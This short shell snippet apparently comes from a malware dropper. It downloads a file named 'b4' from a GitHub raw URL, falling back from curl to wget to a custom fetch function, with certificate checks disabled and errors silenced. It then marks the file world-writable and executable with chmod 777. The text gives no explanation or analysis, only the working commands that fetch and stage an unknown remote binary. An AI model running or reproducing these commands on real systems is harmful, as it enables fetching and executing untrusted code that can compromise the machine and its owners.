curl -L --insecure --connect-timeout 5 --max-time 40 --fail http://raw.githubusercontent.com/anw1012/yw/main/b4 -o b4 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 http://raw.githubusercontent.com/anw1012/yw/main/b4 -O b4 2> /dev/null || _curl http://raw.githubusercontent.com/anw1012/yw/main/b4 > b4 
chmod 777 b4
